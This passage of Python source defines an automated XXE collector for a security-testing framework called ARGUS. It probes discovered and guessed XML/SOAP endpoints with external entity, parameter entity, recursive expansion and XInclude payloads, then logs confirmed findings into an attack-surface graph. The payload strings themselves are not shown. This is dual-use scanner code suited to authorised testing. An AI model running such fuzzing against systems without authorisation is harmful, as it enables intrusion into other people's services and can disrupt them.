        return body[start:end].replace("\r", " ").replace("\n", " ").strip()


class XMLParserSecurityCollector(BaseCollector):
    """
    Autonomous XML Parser Security & XXE Collector for ARGUS.
    Fuzzes discovered XML-accepting endpoints, POST bodies, SOAP envelopes, and parameter-based
    structured XML inputs for insecure parser configurations using AuthenticatedHttpClient.
    """

    XML_CONTENT_TYPES = [
        "application/xml",
        "text/xml",
        "application/soap+xml",
    ]

    XML_PARAM_NAMES = [
        "xml", "xml_data", "xmldata", "doc", "document", "config", "configuration",
        "data", "payload", "request", "req", "msg", "message", "saml", "samlrequest",
        "assertion", "manifest", "template", "query", "order", "input", "body", "file",
    ]

    COMMON_XML_PROBE_ROUTES = [
        "/api/xml", "/xml", "/soap", "/ws", "/service", "/services",
        "/xmlrpc.php", "/saml", "/saml/sso", "/rpc", "/ws/soap", "/api/v1/xml",
    ]

    def __init__(
        self,
        http_client: Optional[Any] = None,
        payload_generator: Optional[XMLPayloadGenerator] = None,
        analyzer: Optional[XMLParserAnalyzer] = None,
        timeout: float = 10.0,
    ):
        self.http_client = http_client
        self.generator = payload_generator or XMLPayloadGenerator()
        self.analyzer = analyzer or XMLParserAnalyzer()
        self.timeout = timeout

    def _normalize_base_url(self, raw_url: str) -> str:
        raw_clean = str(raw_url).strip()
        if not raw_clean.startswith("http://") and not raw_clean.startswith("https://"):
            raw_clean = f"https://{raw_clean}"
        parsed = urllib.parse.urlparse(raw_clean)
        scheme = parsed.scheme or "https"
        netloc = parsed.netloc or parsed.path.split("/")[0]
        return f"{scheme}://{netloc}"

    def _extract_candidate_endpoints(self, mission: Any) -> List[Dict[str, Any]]:
        """
        Extracts structured candidate endpoints, methods, and parameter targets from mission state.
        """
        raw_mission = getattr(mission, "_mission", mission)
        candidates: List[Dict[str, Any]] = []
        seen_urls: Set[Tuple[str, str]] = set()

        base_hosts: List[str] = []
        for h in getattr(raw_mission, "live_hosts", []) or []:
            if isinstance(h, dict):
                url = h.get("url") or h.get("host")
                if url:
                    base_hosts.append(self._normalize_base_url(url))
            elif isinstance(h, str) and h:
                base_hosts.append(self._normalize_base_url(h))

        target_str = getattr(raw_mission, "target", None)
        if target_str:
            base_hosts.append(self._normalize_base_url(str(target_str)))

        base_hosts = list(dict.fromkeys(base_hosts))
        default_base = base_hosts[0] if base_hosts else "https://target.local"

        # 1. Ingest explicit mission endpoints
        for ep in getattr(raw_mission, "endpoints", []) or []:
            raw_url = ""
            method = "POST"
            params_dict: Dict[str, Any] = {}
            body_data: Any = None
            headers_dict: Dict[str, str] = {}

            if isinstance(ep, dict):
                raw_url = ep.get("url") or ep.get("path") or ""
                method = (ep.get("method") or "POST").upper()
                params_dict = ep.get("params") or {}
                body_data = ep.get("body")
                headers_dict = ep.get("headers") or {}
            elif isinstance(ep, str):
                raw_url = ep

            if not raw_url:
                continue

            if not raw_url.startswith("http://") and not raw_url.startswith("https://"):
                full_url = urllib.parse.urljoin(default_base, raw_url)
            else:
                full_url = raw_url

            key = (full_url, method)
            if key not in seen_urls:
                seen_urls.add(key)
                candidates.append({
                    "url": full_url,
                    "method": method,
                    "params": params_dict,
                    "body": body_data,
                    "headers": headers_dict,
                })

        # 2. Add common probe routes for each live host if candidates are few
        if not candidates or len(candidates) < 5:
            for base in base_hosts:
                for probe_path in self.COMMON_XML_PROBE_ROUTES:
                    probe_url = urllib.parse.urljoin(base, probe_path)
                    key = (probe_url, "POST")
                    if key not in seen_urls:
                        seen_urls.add(key)
                        candidates.append({
                            "url": probe_url,
                            "method": "POST",
                            "params": {},
                            "body": None,
                            "headers": {"Content-Type": "application/xml"},
                        })

        return candidates

    def _execute_request(
        self,
        mission: Any,
        method: str,
        url: str,
        params: Optional[Dict[str, Any]] = None,
        data: Optional[Any] = None,
        json_data: Optional[Any] = None,
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
    ) -> Optional[HttpResponse]:
        """Dispatches HTTP request polymorphically via injected or context client."""
        method = method.upper()
        try:
            if self.http_client is not None:
                # Handle injected client (supports mock clients in unit tests)
                if method == "GET" and hasattr(self.http_client, "get"):
                    try:
                        return self.http_client.get(
                            mission, url, params=params, headers=headers, cookies=cookies, timeout=self.timeout
                        )
                    except TypeError:
                        return self.http_client.get(url, params=params, headers=headers)
                elif method == "POST" and hasattr(self.http_client, "post"):
                    try:
                        return self.http_client.post(
                            mission, url, data=data, json=json_data, headers=headers, cookies=cookies, timeout=self.timeout
                        )
                    except TypeError:
                        return self.http_client.post(url, data=data, headers=headers)
                elif hasattr(self.http_client, "request"):
                    try:
                        return self.http_client.request(
                            mission, method, url, params=params, data=data, json=json_data, headers=headers, cookies=cookies, timeout=self.timeout
                        )
                    except TypeError:
                        return self.http_client.request(method, url, data=data, headers=headers)
                elif callable(self.http_client):
                    return self.http_client(url)

            # Fallback to AuthenticatedHttpClient context manager
            with AuthenticatedHttpClient(timeout=self.timeout, max_retries=1) as client:
                if method == "GET":
                    return client.get(mission, url, params=params, headers=headers, cookies=cookies, timeout=self.timeout)
                elif method == "POST":
                    return client.post(mission, url, data=data, json=json_data, headers=headers, cookies=cookies, timeout=self.timeout)
                else:
                    return client.request(mission, method, url, params=params, data=data, json=json_data, headers=headers, cookies=cookies, timeout=self.timeout)
        except Exception as e:
            logger.debug(f"Request failed for {url}: {e}")
            return None

    def collect(self, mission: Any) -> List[Evidence]:
        """
        Executes XML parser security validation across discovered candidate endpoints.
        """
        raw_mission = getattr(mission, "_mission", mission)
        candidates = self._extract_candidate_endpoints(mission)
        detected_evidence: List[Evidence] = []
        confirmed_findings: Set[str] = set()

        if not candidates:
            logger.info("XMLParserSecurityCollector: No candidate endpoints available to audit.")
            return detected_evidence

        logger.info(f"XMLParserSecurityCollector: Auditing {len(candidates)} candidate endpoint(s).")
        all_payloads = self.generator.generate_all_payloads()
        baseline_payload = self.generator.generate_baseline_payload()

        for ep in candidates:
            target_url = ep["url"]
            method = ep["method"]
            headers = dict(ep.get("headers") or {})
            params = dict(ep.get("params") or {})
            body = ep.get("body")
            base_url = self._normalize_base_url(target_url)

            # Step 1: Baseline Calibration Request
            baseline_resp = None
            if method in ("POST", "PUT", "PATCH") and not isinstance(body, dict):
                baseline_resp = self._execute_request(
                    mission,
                    method="POST",
                    url=target_url,
                    data=baseline_payload,
                    headers={"Content-Type": "application/xml", **headers},
                )
            elif method == "GET":
                baseline_resp = self._execute_request(
                    mission,
                    method="GET",
                    url=target_url,
                    headers=headers,
                )
            elif isinstance(body, dict):
                baseline_resp = self._execute_request(
                    mission,
                    method="POST",
                    url=target_url,
                    json_data=body,
                    headers={"Content-Type": "application/json", **headers},
                )

            # Channel A: Raw XML POST Body Fuzzing (when endpoint accepts POST/PUT/PATCH and body is not a dict)
            if method in ("POST", "PUT", "PATCH") and not isinstance(body, dict):
                for p_info in all_payloads:
                    finding_key = f"{target_url}:body:{p_info['target_file']}:{p_info['technique']}"
                    if finding_key in confirmed_findings:
                        continue

                    content_type = p_info.get("content_type", "application/xml")
                    req_headers = {"Content-Type": content_type, **headers}
                    req_data = p_info.get("raw_bytes") or p_info.get("payload")

                    resp = self._execute_request(
                        mission,
                        method=method,
                        url=target_url,
                        data=req_data,
                        headers=req_headers,
                    )

                    if resp is not None:
                        result = self.analyzer.analyze_response(resp, p_info, baseline_response=baseline_resp)
                        if result is not None and result.is_valid_finding:
                            ev = self._create_evidence_and_update_state(
                                mission=mission,
                                target_url=target_url,
                                base_url=base_url,
                                param="xml_body",
                                param_type="body",
                                payload=p_info["payload"],
                                status_code=getattr(resp, "status_code", 200) or 200,
                                result=result,
                            )
                            detected_evidence.append(ev)
                            confirmed_findings.add(finding_key)
                            break  # Move to next endpoint on confirmed critical finding

            # Channel B: Parameter-Based Structured XML Fuzzing (Query Parameters)
            parsed_url = urllib.parse.urlparse(target_url)
            query_params = urllib.parse.parse_qs(parsed_url.query, keep_blank_values=True)
            target_param_names = list(query_params.keys()) or [
                p for p in self.XML_PARAM_NAMES if p in target_url.lower()
            ]

            if query_params or any(p in target_url.lower() for p in self.XML_PARAM_NAMES):
                for param_name in target_param_names:
                    for p_info in all_payloads[:10]:
                        finding_key = f"{target_url}:query:{param_name}:{p_info['target_file']}"
                        if finding_key in confirmed_findings:
                            continue

                        mutated_qs = dict(query_params)
                        mutated_qs[param_name] = [p_info["payload"]]
                        qs_str = urllib.parse.urlencode(mutated_qs, doseq=True)
                        fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=qs_str))

                        resp = self._execute_request(
                            mission,
                            method="GET",
                            url=fuzzed_url,
                            headers=headers,
                        )

                        if resp is not None:
                            result = self.analyzer.analyze_response(resp, p_info, baseline_response=baseline_resp)
                            if result is not None and result.is_valid_finding:
                                ev = self._create_evidence_and_update_state(
                                    mission=mission,
                                    target_url=target_url,
                                    base_url=base_url,
                                    param=param_name,
                                    param_type="query_parameter",
                                    payload=p_info["payload"],
                                    status_code=getattr(resp, "status_code", 200) or 200,
                                    result=result,
                                )
                                detected_evidence.append(ev)
                                confirmed_findings.add(finding_key)
                                break

            # Channel C: Form & JSON Parameters Containing XML Strings
            if isinstance(body, dict):
                for key_name in list(body.keys()):
                    for p_info in all_payloads[:10]:
                        finding_key = f"{target_url}:json:{key_name}:{p_info['target_file']}"
                        if finding_key in confirmed_findings:
                            continue

                        mutated_body = dict(body)
                        mutated_body[key_name] = p_info["payload"]

                        resp = self._execute_request(
                            mission,
                            method="POST",
                            url=target_url,
                            json_data=mutated_body,
                            headers={"Content-Type": "application/json", **headers},
                        )

                        if resp is not None:
                            result = self.analyzer.analyze_response(resp, p_info, baseline_response=baseline_resp)
                            if result is not None and result.is_valid_finding:
                                ev = self._create_evidence_and_update_state(
                                    mission=mission,
                                    target_url=target_url,
                                    base_url=base_url,
                                    param=key_name,
                                    param_type="json_field",
                                    payload=p_info["payload"],
                                    status_code=getattr(resp, "status_code", 200) or 200,
                                    result=result,
                                )
                                detected_evidence.append(ev)
                                confirmed_findings.add(finding_key)
                                break

        logger.info(
            f"XMLParserSecurityCollector complete: {len(detected_evidence)} XML parser misconfiguration finding(s) confirmed."
        )
        return detected_evidence

    def _create_evidence_and_update_state(
        self,
        mission: Any,
        target_url: str,
        base_url: str,
        param: str,
        param_type: str,
        payload: str,
        status_code: int,
        result: XMLValidationResult,
    ) -> Evidence:
        """
        Constructs Evidence, appends to mission.evidence & mission.vulnerabilities,
        and expands the KnowledgeGraph attack surface with HAS_ENDPOINT and HAS_VULNERABILITY edges.
        """
        raw_mission = getattr(mission, "_mission", mission)
        template_id = result.template_id or "xxe"
        technique = result.technique
        severity = result.severity
        confidence = result.confidence
        snippet = result.evidence_snippet
        mutation = result.mutation_strategy

        parsed_url = urllib.parse.urlparse(target_url)
        url_path = parsed_url.path or "/"

        technique_labels = {
            XMLTechnique.ENTITY_RESOLUTION.value: "External Entity Resolution",
            XMLTechnique.PARAMETER_ENTITY.value: "Parameter Entity Resolution",
            XMLTechnique.RECURSIVE_ENTITY.value: "Recursive Entity Expansion",
            XMLTechnique.XINCLUDE.value: "XInclude Directive Processing",
        }
        tech_label = technique_labels.get(technique, technique)

        title = f"XML Parser Misconfiguration ({tech_label}): {param} on {target_url}"
        description = (
            f"Insecure XML parser configuration ({tech_label} / {mutation}) confirmed on endpoint {target_url} "
            f"via {param_type} '{param}' using payload snippet: '{payload[:120]}...'. "
            f"Evidence: {snippet[:200]}"
        )

        ev = Evidence(
            mission_id=getattr(raw_mission, "id", ""),
            source_type="LOG",
            created_by="SYSTEM_GENERATED",
            title=title,
            description=description,
            category="xml_parser_validation",
            value=target_url,
            source=target_url,
            status="CONFIRMED",
            confidence=confidence,
            severity=severity,
            provenance=ProvenanceData(
                step_id="xml_parser_security_collector",
            ),
            tags=["xml_parser_validation", "xxe", "xml_external_entity", technique, template_id],
            metadata={
                "url": target_url,
                "host": base_url,
                "path": url_path,
                "parameter": param,
                "parameter_type": param_type,
                "payload": payload,
                "category": "xml_parser_validation",
                "severity": severity,
                "confidence": confidence,
                "technique": technique,
                "mutation_strategy": mutation,
                "target_file": result.target_file,
                "matched_signature": result.matched_signature,
                "template_id": template_id,
                "status_code": status_code,
                "evidence_snippet": snippet[:250],
                "delay_delta": result.delay_delta,
                "baseline_elapsed": result.baseline_elapsed,
                "injected_elapsed": result.injected_elapsed,
            },
        )

        # 1. Add to raw_mission.evidence
        if hasattr(raw_mission, "evidence") and raw_mission.evidence is not None:
            if hasattr(raw_mission.evidence, "add"):
                raw_mission.evidence.add(ev)
            elif isinstance(raw_mission.evidence, list):
                raw_mission.evidence.append(ev)

        # 2. Add to raw_mission.vulnerabilities
        if hasattr(raw_mission, "vulnerabilities") and isinstance(raw_mission.vulnerabilities, list):
            raw_mission.vulnerabilities.append({
                "name": f"XML Parser Misconfiguration ({tech_label})",
                "template_id": template_id,
                "severity": severity,
                "host": base_url,
                "url": target_url,
                "description": description,
                "parameter": param,
                "parameter_type": param_type,
                "payload": payload,
                "technique": technique,
                "mutation_strategy": mutation,
                "target_file": result.target_file,
            })

        # 3. KnowledgeGraph Node & Edge Expansion
        graph = getattr(raw_mission, "attack_surface_graph", None) or getattr(raw_mission, "graph", None)
        if graph is not None and hasattr(graph, "add") and hasattr(graph, "connect"):
            lh_id = f"live_host:{base_url}"
            ep_id = f"endpoint:{target_url}"
            vuln_id = f"vulnerability:{template_id}:{target_url}:{param}"

            graph.add(Node(id=lh_id, type="live_host", value=base_url, metadata={"url": base_url}))
            graph.add(Node(id=ep_id, type="endpoint", value=target_url, metadata={"url": target_url, "status_code": status_code}))
            graph.add(Node(id=vuln_id, type="vulnerability", value=f"XML Parser Misconfiguration ({tech_label})", metadata=ev.metadata))

            graph.connect(lh_id, ep_id, edge_type="HAS_ENDPOINT")
            graph.connect(lh_id, vuln_id, edge_type="HAS_VULNERABILITY")
            graph.connect(ep_id, vuln_id, edge_type="HAS_VULNERABILITY")

        # 4. Safe publish to ControlledMission wrapper
        if mission is not raw_mission and hasattr(mission, "publish_finding"):
            try:
                mission.publish_finding(ev.evidence_id, ev)
            except Exception:
                pass

        return ev

    def execute(self, mission: Any) -> List[Evidence]:
        """Plugin / Specialist adapter interface."""
        return self.collect(mission)


# Backwards compatibility aliases
XMLParserValidationCollector = XMLParserSecurityCollector
XXECollector = XMLParserSecurityCollector
